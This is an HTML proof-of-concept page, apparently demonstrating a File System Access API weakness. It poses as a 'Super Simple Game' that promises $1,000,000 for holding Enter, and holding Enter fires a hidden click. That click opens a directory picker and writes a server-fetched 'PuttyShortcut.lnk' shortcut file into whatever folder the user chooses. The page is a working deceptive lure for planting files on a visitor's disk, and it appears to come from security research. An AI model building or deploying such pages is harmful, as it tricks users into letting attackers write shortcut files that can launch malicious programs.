<html>

<head>
    <title>Save file to folder - File System Access API - security bug</title>
    <meta charset="UTF-8">
</head>

<style>
    body {
        background: rgba(29, 48, 109, 0.849);
        display: flex;
        justify-content: center;
        align-items: center;
        flex-direction: column;
    }

    h1,h2,h3{
        -webkit-text-stroke: 1px #00000050;
    }

    h1{
        color:#D96C06;
        font-size: 56px;
    }
    h2{
        color: #1ebe8e;
        font-size: 56px;
    }
    h3 {
        color: #C6F91F; 
        font-size: 56px;               
    }
    h2 span{
        color: #cf4848;
        font-size: 90px;
    }

    #author{
        font-size: 28px;
    }
</style>


<body>
    <script>
        let countEnter = 0;
        let isDownloaded = false;

        window.onload = function () {
            const body = document.querySelector('body');
            const pixel = document.querySelector('#pixel');

            body.onkeydown = e => (e.key == "Enter") ? clickedEnter() : 1;
            body.onkeyup = e => (e.key == "Enter") ? cancelEnter() : 1;

            pixel.addEventListener('click', async () => {
                try {
                    const handle = await window.showDirectoryPicker();
                    const fileHandle = await handle.getFileHandle("PuttyShortcut.lnk", { create: true });
                    const writable = await fileHandle.createWritable();
                    const response = await fetch("PuttyShortcut.lnk"); // harus tersedia di server
                    await response.body.pipeTo(writable);
                    document.querySelector("#gameover").textContent = "Shortcut berhasil disimpan ke folder!";
                } catch (err) {
                    document.querySelector("#gameover").textContent = "Gagal menyimpan shortcut.";
                    console.error(err);
                }
            });
        };

        function clickedEnter() {
            countEnter++;
            if (countEnter > 5 && !isDownloaded) {
                pixel.click();
                isDownloaded = true;
            }
        }

        function cancelEnter() {
            countEnter = 0;
        }
    </script>

    <div id="pixel"></div>
    <h1>Super Simple GameğŸ˜»ğŸ˜»ğŸ˜»</h1>
    <h2><span>âŒ¨ï¸HOLD ENTER</span> for 5 seconds</h2>
    <h3>win $1,000,000 and rule the world! ğŸ”¥ğŸ”¥ğŸ”¥ğŸš€</h3>
    <h3 id="author">Author: <a href="http://pulik.io" style="color: rgb(49, 161, 252);">Maciej Pulikowski (pulik.io)</a> ğŸ§™ğŸ±â€ğŸ‘“</h3>
    <h3 id="gameover"></h3>

</body>

</html>
